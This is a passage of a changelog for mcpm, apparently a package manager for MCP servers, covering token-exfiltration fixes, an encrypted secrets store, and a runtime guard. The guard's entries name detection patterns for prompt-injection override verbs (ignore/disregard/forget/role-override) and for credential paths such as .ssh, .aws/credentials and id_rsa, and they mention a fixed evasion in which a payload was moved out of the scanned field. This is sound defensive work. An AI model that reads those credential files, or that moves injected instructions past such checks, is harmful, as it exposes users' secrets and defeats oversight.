- **`mcpm why <server>`** — explain a server's trust score as an auditable breakdown: each component's earned/max points, every finding (severity + message + location), the registry-meta cap flag, and the declared env vars. Read-only; supports `--json`.

### Security

Resolved the 4 HIGH-severity findings from a security review:

- **Publish token exfiltration** — `mcpm publish --registry <host>` no longer sends the GitHub token to an arbitrary host. The URL is validated (https-only; loopback/private/IPv4-mapped-IPv6/internal hosts rejected; no embedded credentials) before the token is attached, and `fetch` uses `redirect:"manual"` so a 3xx can't carry the token onward.
- **Health-check env leak** — the env forwarded to the spawned (untrusted) server during a health check is now an allowlist, not a denylist, so custom-named secrets (`STRIPE_KEY`, …) no longer leak.
- **Guard detection bypass** — guard now scans `result.structuredContent`, the JSON-RPC `error` object, and the full tool `inputSchema` (not just `description`), closing a one-line payload-relocation evasion. FP corpus re-validated (0/24).
- **Secret-store honesty** — docs/notices no longer overclaim at-rest guarantees for the machine-keyed store; the decision is recorded in the Decisions Log.

### Changed

- Added `.github/dependabot.yml` (weekly github-actions + npm updates).

## [0.6.0] - 2026-06-01

### Added

**Encrypted secrets — `mcpm secrets`.** Store MCP server credentials AES-GCM-encrypted in `~/.mcpm` instead of as plaintext in client config files. When a server is wrapped by mcpm-guard, the credential is resolved into the server's environment at launch, so the plaintext never touches disk.

New command:

- `mcpm secrets set <server> <KEY>` — store an encrypted secret (masked prompt)
- `mcpm secrets list [server]` — list stored secret keys (values are never shown)
- `mcpm secrets get <server> <KEY> --reveal` — print a decrypted secret
- `mcpm secrets rm <server> <KEY>` — delete a stored secret

New flags:

- `mcpm install --secrets keychain` and `mcpm up --secrets keychain` — write `mcpm:keychain:…` placeholders for secret env vars instead of plaintext (opt-in; default unchanged). `up --secrets keychain` is rejected under `--ci`.

### Changed

- `mcpm guard disable` now warns when an unwrapped config still references `mcpm:keychain:` placeholders that will no longer resolve.
- Node support: dropped Node 20, added Node 26 (`engines` now `>=22`).

### Security

- Keychain ids are derived injectively (sanitized prefix + SHA-256 suffix), so two distinct server names can never share a secret namespace.
- A server's secrets are persisted in a single atomic batch — no orphaned half-written secrets if one fails.

## [0.5.0] - 2026-05-17

### Added

**mcpm-guard — runtime defense bundled into the package manager.** Wraps every installed MCP server with an inspection relay; blocks prompt-injection in tool responses, schema rug-pulls since install, and exfil-shaped tool-call arguments. The first MCP runtime defense distributed inside a package manager — adoption is one command (`mcpm guard enable`) instead of an afternoon of per-IDE config wrapping.

New commands:

- `mcpm guard enable [--client] [--server] [--dry-run]` — wrap detected client configs
- `mcpm guard disable [--client] [--server]` — unwrap (per-server scope supported)
- `mcpm guard status` — show what's wrapped + pin state per server
- `mcpm guard demo` — synthetic prompt-injection scenario; see a live block in seconds
- `mcpm guard accept-drift <server> [--tool] --new-hash <sha> --yes` — re-pin after a legitimate server upgrade
- `mcpm guard mute <signature-id> [--for <duration>]` — disable a signature with optional auto-expiry
- `mcpm guard unmute <signature-id>` — re-enable
- `mcpm guard pause [--for <duration>] [--off]` — pause all inspection for a window (debugging escape hatch)
- `mcpm guard cleanup [--yes]` — prune pin entries for uninstalled servers
- `mcpm guard list-signatures [--json]` — show the shipped OWASP MCP Top 10 signature catalog
- `mcpm guard reset-integrity [--policy] [--yes]` — regenerate the integrity sidecar after manual edits

What it catches (3 shipped signatures + 2 drift detectors):

- OWASP-MCP-1 — tool-description poisoning + schema drift since install (rug-pull defense; install-time SHA-256 pin + same-session hash cache catches mid-session mutation)
- OWASP-MCP-2 — instruction injection in tool responses (NFKC + zero-width-strip + ignore/disregard/forget/role-override variants)
- OWASP-MCP-7 — sensitive-path exfil in tool arguments (.ssh / .aws/credentials / .env / id_rsa / .gnupg / .kube/config)

Performance: p99 0.065ms small / 3.1ms large message overhead through the SDK framing helpers (78× / 8× under design budget).

Detection is deterministic regex-only — no model API calls, no secrets in CI. Detection sophistication is not the v0.5.0 wedge; distribution is. (LLM-as-judge tier deferred to v0.5.1+.)

Files written under `~/.mcpm/`: `pins.json` + `.integrity` sidecar (schema pins), `guard-policy.yaml` + `.integrity` sidecar (user overrides), `guard-events.jsonl` (append-only event log; parse with `jq`).

Threat model + full reference: `docs/GUARD.md`, `docs/SIGNATURES.md`, `docs/POLICY.md`.

### Changed

- `BaseAdapter` gains `replaceServer(configPath, name, entry)` — atomic write + `.bak` discipline, used by guard's wrap orchestration but available to any future feature.

### Security

The guard subsystem went through 6 rounds of independent security review during development; every CRITICAL and HIGH finding was fixed before commit. Highlights:

- **applyPolicy logic bug** that would have let any single mute silently downgrade `block` on unrelated critical findings — caught + fixed with dedicated regression suite
- **SDK transport misread** — original substrate proposed full Transport classes; reviewer caught they hardcode process stdio. Fixed by using the framing helpers directly
- **Integrity sidecars** added to both `pins.json` and `guard-policy.yaml` — protects against same-machine tampering (npm postinstall scripts, etc.)
- **Zod-validated YAML parse** rejects malformed policy shapes (e.g. numeric `paused_until` that would otherwise bypass all inspection)
- **DoS-resistant relay** — 64MB per-direction buffer cap, signal-listener cleanup on child exit, write-after-close handler on `child.stdin`
- **Detection evasion hardening** — NFKC + zero-width-strip + bidi-override strip + whitespace alternation (`[\s]+`) + multiple synonym variants per attack class
- **Env scoping** — pin-capture subprocesses get an allowlisted env (no leak of `OPENAI_API_KEY` / `AWS_*` / `GITHUB_TOKEN` to a server we're wrapping precisely because we don't fully trust it)

CI gates: MCPTox-derived deterministic fixture eval (25 fixtures across attack categories) + FP-rate corpus measurement (5-session seed, < 2% threshold; 0/24 false positives on the seed).

### For contributors

- `src/guard/` is the new subsystem (~3,000 lines incl. tests)
- 159 new guard tests added; full suite is 1,053 tests
- `docs/GUARD.md` for the runtime model, `docs/SIGNATURES.md` for signature authoring, `docs/POLICY.md` for the policy file format
- 30 deferred-work entries logged in `TODOS.md` (#16-30) — separate signatures repo, base64-decoding preprocessor, NFC normalize migration, LLM-judge tier, full 20-server FP corpus capture, etc.

## [0.4.0] - 2026-05-12

### Added
- `mcpm outdated` — detect version drift and trust regression across installed servers. Shows which servers have newer releases and flags servers whose trust score has degraded since install.
- Encrypted secrets store (`mcpm secrets`) — store MCP server credentials locally using AES-GCM encryption with PBKDF2 key derivation. Zero native dependencies; uses Node.js built-in `crypto.subtle`.
- `mcpm publish` — scaffold, validate, and submit MCP server packages to the registry. Includes a 5-step interactive wizard (`mcpm publish scaffold`), a pre-flight trust gate (`mcpm publish check`), and submission (`mcpm publish`).
- ServersFile schema v2 — servers file now uses `{ mcpmSchemaVersion: 2, servers: [...] }` format with backward-compatible migration from the legacy bare-array format.

### Removed
- Telemetry infrastructure removed — aligns with the documented "No telemetry. No analytics. No account required." guarantee.

## [0.3.3] - 2025-01-01

See previous releases for earlier changelog entries.
